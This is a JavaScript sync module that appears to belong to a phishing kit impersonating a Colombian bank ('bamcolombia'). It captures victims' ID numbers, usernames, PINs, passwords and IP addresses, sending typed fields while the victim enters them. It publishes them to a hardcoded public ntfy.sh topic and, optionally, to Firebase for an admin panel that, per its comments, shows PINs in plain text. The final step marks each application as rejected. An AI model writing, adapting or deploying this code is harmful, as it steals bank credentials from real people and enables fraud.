/**
 * Persist flow submissions with same-browser + WORLDWIDE cloud sync.
 *
 * Local: localStorage + BroadcastChannel (same origin / same phone browser)
 * Remote: ntfy.sh pub/sub by room code (any device, any country) + optional Firebase RTDB
 *
 * Room (zero setup): BcSyncConfig.room is hardcoded and locked by default.
 * Optional override only via ?sala= / ?room= in the URL.
 * Flow URLs without ?sala= still sync to the default room worldwide.
 */
(function (global) {
  var STORE_KEY = "bc_solicitudes";
  var DRAFT_KEY = "bc_solicitud_draft";
  var ROOM_KEY = "bc_sync_room";
  var CHANNEL = "bc-solicitudes";
  var TZ = "America/Bogota";
  var POLL_MS = 400;
  var cfg = global.BcSyncConfig || {};
  var REMOTE_POLL_MS = Number(cfg.pollMs) || 3500;
  var lastRemotePresence = 0;
  var MAX_REMOTE = Number(cfg.maxRemoteRecords) || 12;
  var NTFY = String(cfg.ntfy || "https://ntfy.sh").replace(/\/$/, "");
  var FIREBASE = String(cfg.firebaseUrl || "").replace(/\/$/, "");
  var DEFAULT_ROOM = String(cfg.room || "bamcolombia");
  var LOCK_ROOM = cfg.lockRoom !== false;
  var applyingRemote = false;
  var remoteStatus = { ok: false, lastAt: 0, lastError: "", mode: "init" };
  var remoteHandlers = [];
  var es = null;
  var remotePollTimer = null;
  var publishTimer = null;
  var lastPublishedSig = "";

  function nowIso() {
    return new Date().toISOString();
  }

  function bogotaLabel(d) {
    d = d || new Date();
    try {
      return new Intl.DateTimeFormat("es-CO", {
        timeZone: TZ,
        weekday: "long",
        year: "numeric",
        month: "long",
        day: "numeric",
        hour: "numeric",
        minute: "2-digit",
        hour12: true,
      }).format(d);
    } catch (e) {
      return d.toLocaleString("es-CO");
    }
  }

  function uid() {
    return (
      "sol_" +
      Date.now().toString(36) +
      "_" +
      Math.random().toString(36).slice(2, 8)
    );
  }

  function normalizeRoom(r) {
    var n = String(r || "")
      .toLowerCase()
      .replace(/[^a-z0-9_-]/g, "")
      .slice(0, 40);
    return n || normalizeRoom(DEFAULT_ROOM) || "bamcolombia";
  }

  function readRoomFromUrl() {
    try {
      var u = new URL(location.href);
      return u.searchParams.get("sala") || u.searchParams.get("room") || "";
    } catch (e) {
      return "";
    }
  }

  function getRoom() {
    var fromUrl = readRoomFromUrl();
    if (fromUrl) {
      var n = normalizeRoom(fromUrl);
      try {
        localStorage.setItem(ROOM_KEY, n);
      } catch (e) {}
      return n;
    }
    // Hardcoded default — admin + flow always share this (no sala setup).
    // lockRoom ignores stale localStorage so every device stays on bamcolombia.
    if (LOCK_ROOM) {
      var locked = normalizeRoom(DEFAULT_ROOM);
      try {
        localStorage.setItem(ROOM_KEY, locked);
      } catch (e) {}
      return locked;
    }
    try {
      var saved = localStorage.getItem(ROOM_KEY);
      if (saved) return normalizeRoom(saved);
    } catch (e) {}
    return normalizeRoom(DEFAULT_ROOM);
  }

  function setRoom(r) {
    // With lockRoom, keep the hardcoded default (zero-setup product path).
    var n = LOCK_ROOM ? normalizeRoom(DEFAULT_ROOM) : normalizeRoom(r);
    try {
      localStorage.setItem(ROOM_KEY, n);
    } catch (e) {}
    lastPublishedSig = "";
    restartRemote();
    broadcast({ type: "room", room: n, at: nowIso() });
    notifyRemoteHandlers("room", { room: n });
    return n;
  }

  function topic() {
    return "bc-bam-" + getRoom();
  }

  function withRoom(url) {
    // Clean URLs: default room needs no ?sala=; optional override still works if present.
    try {
      var u = new URL(url, location.href);
      u.searchParams.delete("sala");
      u.searchParams.delete("room");
      return u.pathname.replace(/^\//, "") === ""
        ? u.href
        : u.pathname.split("/").pop() + u.search + u.hash;
    } catch (e) {
      return String(url || "");
    }
  }

  function flowShareUrl(page) {
    page = page || "index.html";
    try {
      var u = new URL(page, location.href);
      u.searchParams.delete("sala");
      u.searchParams.delete("room");
      return u.href;
    } catch (e) {
      return withRoom(page);
    }
  }

  function readAll() {
    try {
      var raw = localStorage.getItem(STORE_KEY);
      if (!raw) return [];
      var arr = JSON.parse(raw);
      return Array.isArray(arr) ? arr : [];
    } catch (e) {
      return [];
    }
  }

  function broadcast(msg) {
    try {
      if (bc) bc.postMessage(msg);
    } catch (e) {}
  }

  function notifyRemoteHandlers(source, data) {
    remoteHandlers.slice().forEach(function (fn) {
      try {
        fn(source, data || {});
      } catch (e) {}
    });
  }

  function writeAll(list, opts) {
    opts = opts || {};
    localStorage.setItem(STORE_KEY, JSON.stringify(list));
    broadcast({ type: "solicitudes-updated", at: nowIso(), count: list.length });
    if (!opts.skipRemote && !applyingRemote) {
      scheduleRemotePublish(list);
    }
  }

  var bc = null;
  try {
    if (typeof BroadcastChannel !== "undefined") {
      bc = new BroadcastChannel(CHANNEL);
    }
  } catch (e) {
    bc = null;
  }

  function getDraftId() {
    return localStorage.getItem(DRAFT_KEY) || "";
  }

  function setDraftId(id) {
    if (id) localStorage.setItem(DRAFT_KEY, id);
    else localStorage.removeItem(DRAFT_KEY);
  }

  function findById(list, id) {
    for (var i = 0; i < list.length; i++) {
      if (list[i].id === id) return i;
    }
    return -1;
  }

  function ensureDraft(seed) {
    var list = readAll();
    var id = getDraftId();
    var idx = id ? findById(list, id) : -1;
    var rec;
    if (idx >= 0) {
      rec = list[idx];
    } else {
      rec = {
        id: uid(),
        status: "en_progreso",
        tipo: "",
        documento: "",
        contacto: "",
        cupo: "",
        consent: false,
        usuario: "",
        clave: "",
        password: "",
        ip: "",
        fechaBogota: "",
        createdAt: nowIso(),
        updatedAt: nowIso(),
        steps: {},
      };
      list.unshift(rec);
      setDraftId(rec.id);
    }
    if (seed && typeof seed === "object") {
      Object.keys(seed).forEach(function (k) {
        if (k === "id" || k === "steps" || k === "createdAt") return;
        if (seed[k] !== undefined && seed[k] !== null && seed[k] !== "") {
          rec[k] = seed[k];
        }
      });
    }
    rec.updatedAt = nowIso();
    if (!rec.fechaBogota) rec.fechaBogota = bogotaLabel();
    idx = findById(list, rec.id);
    if (idx >= 0) list[idx] = rec;
    else list.unshift(rec);
    writeAll(list);
    return rec;
  }

  /** Live partial update while typing — grows the admin row in real time (local + cloud). */
  function livePatch(fields) {
    var rec = ensureDraft(fields || {});
    var list = readAll();
    var idx = findById(list, rec.id);
    if (idx < 0) return rec;
    rec = list[idx];
    if (fields && typeof fields === "object") {
      Object.keys(fields).forEach(function (k) {
        if (k === "id" || k === "steps" || k === "createdAt") return;
        if (fields[k] === undefined || fields[k] === null) return;
        rec[k] = fields[k];
      });
    }
    rec.updatedAt = nowIso();
    rec.fechaBogota = bogotaLabel();
    if (rec.status !== "rechazada") rec.status = "en_progreso";
    list[idx] = rec;
    writeAll(list);
    broadcast({ type: "live", id: rec.id, fields: fields || {}, at: nowIso() });
    return rec;
  }

  function debounce(fn, ms) {
    var t = null;
    var pending = null;
    var wrapped = function () {
      var ctx = this;
      var args = arguments;
      pending = { ctx: ctx, args: args };
      clearTimeout(t);
      t = setTimeout(function () {
        pending = null;
        fn.apply(ctx, args);
      }, ms || 120);
    };
    wrapped.flush = function () {
      if (!pending) return;
      clearTimeout(t);
      var p = pending;
      pending = null;
      fn.apply(p.ctx, p.args);
    };
    wrapped.cancel = function () {
      clearTimeout(t);
      pending = null;
    };
    return wrapped;
  }

  var pendingFlushers = [];
  function registerFlusher(fn) {
    if (typeof fn === "function") pendingFlushers.push(fn);
  }
  function flushAll() {
    pendingFlushers.slice().forEach(function (fn) {
      try {
        fn();
      } catch (e) {}
    });
    flushRemotePublish();
  }
  ["pagehide", "beforeunload", "visibilitychange"].forEach(function (evt) {
    window.addEventListener(evt, function () {
      if (evt === "visibilitychange" && document.visibilityState !== "hidden") return;
      flushAll();
    });
  });

  function markStep(stepName, fields) {
    var rec = ensureDraft(fields || {});
    var list = readAll();
    var idx = findById(list, rec.id);
    if (idx < 0) return rec;
    rec = list[idx];
    if (!rec.steps) rec.steps = {};
    rec.steps[stepName] = {
      at: nowIso(),
      label: bogotaLabel(),
    };
    if (fields && typeof fields === "object") {
      Object.keys(fields).forEach(function (k) {
        if (k === "id" || k === "steps") return;
        if (fields[k] !== undefined && fields[k] !== null && fields[k] !== "") {
          rec[k] = fields[k];
        }
      });
    }
    rec.updatedAt = nowIso();
    rec.fechaBogota = bogotaLabel();
    if (stepName === "confirm") {
      rec.status = "rechazada";
      setDraftId("");
    } else if (rec.status !== "rechazada") {
      rec.status = "en_progreso";
    }
    list[idx] = rec;
    writeAll(list);
    broadcast({ type: "step", step: stepName, id: rec.id, at: nowIso() });
    return rec;
  }

  function setIp(ip) {
    if (!ip || ip === "—") return;
    var id = getDraftId();
    if (!id) return;
    var list = readAll();
    var idx = findById(list, id);
    if (idx < 0) return;
    list[idx].ip = ip;
    list[idx].updatedAt = nowIso();
    writeAll(list);
  }

  function fetchIpThen(cb) {
    function ok(ip) {
      if (ip && /^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) {
        setIp(ip);
        if (cb) cb(ip);
        return true;
      }
      return false;
    }
    function tryUrl(url, parse) {
      return fetch(url, { cache: "no-store" })
        .then(function (r) {
          if (!r.ok) throw new Error("bad");
          return parse(r);
        })
        .then(function (ip) {
          if (!ok(String(ip).trim())) throw new Error("bad ip");
        });
    }
    tryUrl("https://api.ipify.org?format=json", function (r) {
      return r.json().then(function (j) {
        return j.ip;
      });
    }).catch(function () {
      return tryUrl("https://api64.ipify.org?format=json", function (r) {
        return r.json().then(function (j) {
          return j.ip;
        });
      });
    }).catch(function () {
      if (cb) cb("");
    });
  }

  function clearAll() {
    localStorage.removeItem(STORE_KEY);
    localStorage.removeItem(DRAFT_KEY);
    broadcast({ type: "solicitudes-updated", at: nowIso(), count: 0, cleared: true });
    scheduleRemotePublish([]);
  }

  /** Admin shows PIN/clave in plain text (not masked). */
  function maskClave(v) {
    if (v === undefined || v === null || v === "") return "—";
    return String(v);
  }

  function displaySecret(v) {
    return maskClave(v);
  }

  function mergeRemoteList(incoming) {
    if (!Array.isArray(incoming)) return false;
    applyingRemote = true;
    try {
      var local = readAll();
      var byId = {};
      local.forEach(function (r) {
        if (r && r.id) byId[r.id] = r;
      });
      var changed = false;
      incoming.forEach(function (r) {
        if (!r || !r.id) return;
        var cur = byId[r.id];
        if (!cur) {
          byId[r.id] = r;
          changed = true;
          return;
        }
        var a = Date.parse(r.updatedAt || r.createdAt || 0) || 0;
        var b = Date.parse(cur.updatedAt || cur.createdAt || 0) || 0;
        if (a >= b) {
          byId[r.id] = r;
          if (JSON.stringify(cur) !== JSON.stringify(r)) changed = true;
        }
      });
      if (!changed && local.length === Object.keys(byId).length) return false;
      var next = Object.keys(byId)
        .map(function (k) {
          return byId[k];
        })
        .sort(function (x, y) {
          return (
            (Date.parse(y.updatedAt || y.createdAt || 0) || 0) -
            (Date.parse(x.updatedAt || x.createdAt || 0) || 0)
          );
        });
      writeAll(next, { skipRemote: true });
      return true;
    } finally {
      applyingRemote = false;
    }
  }

  function applyRemotePayload(payload, source) {
    if (!payload || typeof payload !== "object") return;
    if (payload.room && normalizeRoom(payload.room) !== getRoom()) return;
    var changed = false;
    if (payload.type === "snapshot" && Array.isArray(payload.list)) {
      changed = mergeRemoteList(payload.list);
      if (payload.draftId) {
        try {
          /* admin should not steal flow draft id on viewer devices */
          if ((location.pathname || "").indexOf("admin.html") === -1) {
            setDraftId(payload.draftId);
          }
        } catch (e) {}
      }
    } else if (payload.type === "upsert" && payload.rec && payload.rec.id) {
      changed = mergeRemoteList([payload.rec]);
    } else if (payload.type === "presence") {
      notifyRemoteHandlers("presence", payload);
      remoteStatus.ok = true;
      remoteStatus.lastAt = Date.now();
      return;
    } else if (Array.isArray(payload.list)) {
      changed = mergeRemoteList(payload.list);
    }
    if (changed) {
      remoteStatus.ok = true;
      remoteStatus.lastAt = Date.now();
      remoteStatus.mode = source || "remote";
      notifyRemoteHandlers("remote", payload);
      broadcast({ type: "solicitudes-updated", at: nowIso(), from: "remote" });
    }
  }

  function parseMaybeJson(text) {
    if (!text) return null;
    try {
      return JSON.parse(text);
    } catch (e) {
      return null;
    }
  }

  function buildPayload(list) {
    var slim = (list || []).slice(0, MAX_REMOTE);
    return {
      type: "snapshot",
      v: 1,
      room: getRoom(),
      draftId: getDraftId() || "",
      at: nowIso(),
      list: slim,
      page: pageName(),
    };
  }

  function scheduleRemotePublish(list) {
    clearTimeout(publishTimer);
    publishTimer = setTimeout(function () {
      publishTimer = null;
      doRemotePublish(list != null ? list : readAll());
    }, 450);
  }

  function flushRemotePublish() {
    clearTimeout(publishTimer);
    publishTimer = null;
    doRemotePublish(readAll());
  }

  function doRemotePublish(list) {
    if (applyingRemote) return;
    var payload = buildPayload(list);
    var body = JSON.stringify(payload);
    if (body.length > 3500) {
      payload.list = (payload.list || []).slice(0, 6);
      body = JSON.stringify(payload);
    }
    if (body === lastPublishedSig) return;
    lastPublishedSig = body;

    // 1) ntfy.sh — free public pub/sub, works from any browser worldwide
    fetch(NTFY + "/" + encodeURIComponent(topic()), {
      method: "POST",
      headers: {
        "Content-Type": "text/plain; charset=utf-8",
        Title: "bc-sync",
        Tags: "outbox_tray",
        Priority: "default",
      },
      body: body,
      mode: "cors",
      cache: "no-store",
    })
      .then(function (r) {
        if (!r.ok) throw new Error("ntfy " + r.status);
        remoteStatus.ok = true;
        remoteStatus.lastAt = Date.now();
        remoteStatus.lastError = "";
        remoteStatus.mode = "ntfy";
        notifyRemoteHandlers("remote-status", remoteStatus);
      })
      .catch(function (err) {
        remoteStatus.lastError = String((err && err.message) || err || "ntfy");
        notifyRemoteHandlers("remote-status", remoteStatus);
      });

    // 2) Optional Firebase RTDB REST (paste firebaseUrl in sync-config.js)
    if (FIREBASE) {
      var fbUrl =
        FIREBASE +
        "/rooms/" +
        encodeURIComponent(getRoom()) +
        "/state.json";
      fetch(fbUrl, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: body,
        mode: "cors",
        cache: "no-store",
      }).catch(function () {});
    }
  }

  function pollNtfy() {
    var url =
      NTFY +
      "/" +
      encodeURIComponent(topic()) +
      "/json?poll=1&since=12h";
    return fetch(url, { mode: "cors", cache: "no-store" })
      .then(function (r) {
        if (!r.ok) throw new Error("poll " + r.status);
        return r.text();
      })
      .then(function (text) {
        var lines = String(text || "").split("\n");
        var latest = null;
        lines.forEach(function (line) {
          line = line.trim();
          if (!line) return;
          var row = parseMaybeJson(line);
          if (!row || row.event !== "message") return;
          var msg = parseMaybeJson(row.message);
          if (msg && (msg.type === "snapshot" || msg.type === "upsert" || msg.list)) {
            latest = msg;
          } else if (msg && msg.type === "presence") {
            applyRemotePayload(msg, "ntfy-presence");
          }
        });
        if (latest) applyRemotePayload(latest, "ntfy-poll");
        remoteStatus.ok = true;
        remoteStatus.lastAt = Date.now();
        remoteStatus.mode = "ntfy";
        notifyRemoteHandlers("remote-status", remoteStatus);
      })
      .catch(function (err) {
        remoteStatus.lastError = String((err && err.message) || err || "poll");
        notifyRemoteHandlers("remote-status", remoteStatus);
      });
  }

  function pollFirebase() {
    if (!FIREBASE) return Promise.resolve();
    var fbUrl =
      FIREBASE +
      "/rooms/" +
      encodeURIComponent(getRoom()) +
      "/state.json";
    return fetch(fbUrl, { mode: "cors", cache: "no-store" })
      .then(function (r) {
        if (!r.ok) throw new Error("fb " + r.status);
        return r.json();
      })
      .then(function (data) {
        if (data) applyRemotePayload(data, "firebase");
      })
      .catch(function () {});
  }

  function startSse() {
    if (typeof EventSource === "undefined") return;
    try {
      if (es) {
        es.close();
        es = null;
      }
    } catch (e) {}
    try {
      es = new EventSource(NTFY + "/" + encodeURIComponent(topic()) + "/sse");
      es.onmessage = function (ev) {
        var row = parseMaybeJson(ev.data);
        if (!row) return;
        if (row.event && row.event !== "message") return;
        var msg = parseMaybeJson(row.message);
        if (msg) applyRemotePayload(msg, "ntfy-sse");
      };
      es.onerror = function () {
        /* EventSource reconnects; also rely on poll */
      };
    } catch (e) {
      es = null;
    }
  }

  function restartRemote() {
    try {
      if (es) es.close();
    } catch (e) {}
    es = null;
    if (remotePollTimer) clearInterval(remotePollTimer);
    startSse();
    pollNtfy();
    pollFirebase();
    remotePollTimer = setInterval(function () {
      pollNtfy();
      pollFirebase();
    }, REMOTE_POLL_MS);
  }

  function onChange(handler) {
    if (typeof handler !== "function") return function () {};
    var ch = null;
    var lastPush = 0;
    remoteHandlers.push(handler);
    try {
      if (typeof BroadcastChannel !== "undefined") {
        ch = new BroadcastChannel(CHANNEL);
        ch.onmessage = function (ev) {
          var data = (ev && ev.data) || {};
          if (data.type === "presence") {
            handler("presence", data);
            return;
          }
          lastPush = Date.now();
          handler("broadcast", data);
        };
      }
    } catch (e) {}
    function onStorage(e) {
      if (!e.key || e.key === STORE_KEY || e.key === DRAFT_KEY || e.key === ROOM_KEY) {
        lastPush = Date.now();
        handler("storage");
      }
    }
    window.addEventListener("storage", onStorage);
    var poll = setInterval(function () {
      if (Date.now() - lastPush < POLL_MS + 50) return;
      handler("poll");
    }, POLL_MS);
    return function unsubscribe() {
      window.removeEventListener("storage", onStorage);
      clearInterval(poll);
      remoteHandlers = remoteHandlers.filter(function (fn) {
        return fn !== handler;
      });
      try {
        if (ch) ch.close();
      } catch (e) {}
    };
  }

  function watchFooterIp() {
    var el = document.getElementById("footer-ip");
    if (!el) return;
    var last = "";
    function tick() {
      var t = (el.textContent || "").trim();
      if (t && t !== "—" && t !== last) {
        last = t;
        setIp(t);
      }
    }
    tick();
    setInterval(tick, 1500);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", watchFooterIp);
  } else {
    watchFooterIp();
  }

  function storageOk() {
    try {
      var k = "__bc_probe__";
      localStorage.setItem(k, "1");
      localStorage.removeItem(k);
      return true;
    } catch (e) {
      return false;
    }
  }

  function origin() {
    try {
      return location.origin || location.protocol + "//" + (location.host || "file");
    } catch (e) {
      return "";
    }
  }

  function isHttpOrigin() {
    try {
      return location.protocol === "http:" || location.protocol === "https:";
    } catch (e) {
      return false;
    }
  }

  /** Local same-browser sync needs HTTP; cloud sync works whenever fetch works. */
  function syncReliable() {
    return isHttpOrigin() && storageOk();
  }

  function remoteOk() {
    return !!remoteStatus.ok && Date.now() - remoteStatus.lastAt < 20000;
  }

  function pageName() {
    try {
      var p = (location.pathname || "").split("/").pop() || "index.html";
      return p || "index.html";
    } catch (e) {
      return "page";
    }
  }

  function startPresence() {
    function beat() {
      var msg = {
        type: "presence",
        page: pageName(),
        at: nowIso(),
        draft: getDraftId() || "",
        room: getRoom(),
      };
      broadcast(msg);
      // Remote presence sparingly — ntfy rate-limits chatty topics
      if (Date.now() - lastRemotePresence < 45000) return;
      lastRemotePresence = Date.now();
      try {
        fetch(NTFY + "/" + encodeURIComponent(topic()), {
          method: "POST",
          headers: {
            "Content-Type": "text/plain; charset=utf-8",
            Title: "bc-presence",
            Priority: "min",
          },
          body: JSON.stringify(msg),
          mode: "cors",
          cache: "no-store",
        }).catch(function () {});
      } catch (e) {}
    }
    beat();
    setInterval(beat, 5000);
  }

  function injectOriginBanner() {
    if (syncReliable()) return;
    if (document.getElementById("bc-origin-banner")) return;
    var bar = document.createElement("div");
    bar.id = "bc-origin-banner";
    bar.setAttribute("role", "alert");
    bar.style.cssText =
      "position:sticky;top:0;z-index:99999;background:#c62828;color:#fff;" +
      "padding:0.85rem 1rem;font:600 0.92rem/1.35 Helvetica,Arial,sans-serif;" +
      "box-shadow:0 2px 10px rgba(0,0,0,.2)";
    bar.innerHTML =
      "<strong>localStorage local inactivo (file://).</strong> " +
      "La sync en la nube (sala fija bamcolombia) sigue activa si hay red. " +
      "Para local+remoto preferible HTTP: <code style=\"background:rgba(0,0,0,.2);padding:0 .25rem\">./servir.sh</code> " +
      "o GitHub Pages.";
    var mount = function () {
      if (document.body) document.body.insertBefore(bar, document.body.firstChild);
      else document.addEventListener("DOMContentLoaded", mount);
    };
    mount();
  }

  function fixBaseForPages() {
    try {
      var path = location.pathname || "";
      if (path.indexOf("/bamcolombia/") === -1) return;
      if (document.querySelector("base")) return;
      var b = document.createElement("base");
      b.href = "/bamcolombia/";
      document.head.insertBefore(b, document.head.firstChild);
    } catch (e) {}
  }

  fixBaseForPages();

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", injectOriginBanner);
  } else {
    injectOriginBanner();
  }

  // Auto-connect hardcoded room on every page load (no sala UI / no ?sala= needed)
  getRoom();
  restartRemote();

  // Flow pages announce presence so admin can show "flujo conectado"
  try {
    var path = (location.pathname || "").toLowerCase();
    if (path.indexOf("admin.html") === -1) {
      if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", startPresence);
      } else {
        startPresence();
      }
      // Publish current local state once so a late admin can catch up
      setTimeout(function () {
        var list = readAll();
        if (list.length) scheduleRemotePublish(list);
      }, 800);
    } else {
      // Admin: pull cloud state immediately
      pollNtfy();
      pollFirebase();
    }
  } catch (e) {}

  global.BcStore = {
    STORE_KEY: STORE_KEY,
    DRAFT_KEY: DRAFT_KEY,
    ROOM_KEY: ROOM_KEY,
    CHANNEL: CHANNEL,
    POLL_MS: POLL_MS,
    readAll: readAll,
    writeAll: writeAll,
    ensureDraft: ensureDraft,
    livePatch: livePatch,
    debounce: debounce,
    registerFlusher: registerFlusher,
    flushAll: flushAll,
    markStep: markStep,
    setIp: setIp,
    fetchIpThen: fetchIpThen,
    clearAll: clearAll,
    maskClave: maskClave,
    displaySecret: displaySecret,
    onChange: onChange,
    bogotaLabel: bogotaLabel,
    getDraftId: getDraftId,
    storageOk: storageOk,
    syncReliable: syncReliable,
    isHttpOrigin: isHttpOrigin,
    origin: origin,
    broadcast: broadcast,
    getRoom: getRoom,
    setRoom: setRoom,
    withRoom: withRoom,
    flowShareUrl: flowShareUrl,
    topic: topic,
    remoteOk: remoteOk,
    remoteStatus: function () {
      return {
        ok: remoteStatus.ok,
        lastAt: remoteStatus.lastAt,
        lastError: remoteStatus.lastError,
        mode: remoteStatus.mode,
        room: getRoom(),
        topic: topic(),
        ntfy: NTFY,
        firebase: !!FIREBASE,
      };
    },
    publishNow: function () {
      lastPublishedSig = "";
      flushRemotePublish();
    },
    pullRemote: function () {
      return Promise.all([pollNtfy(), pollFirebase()]);
    },
  };
})(window);
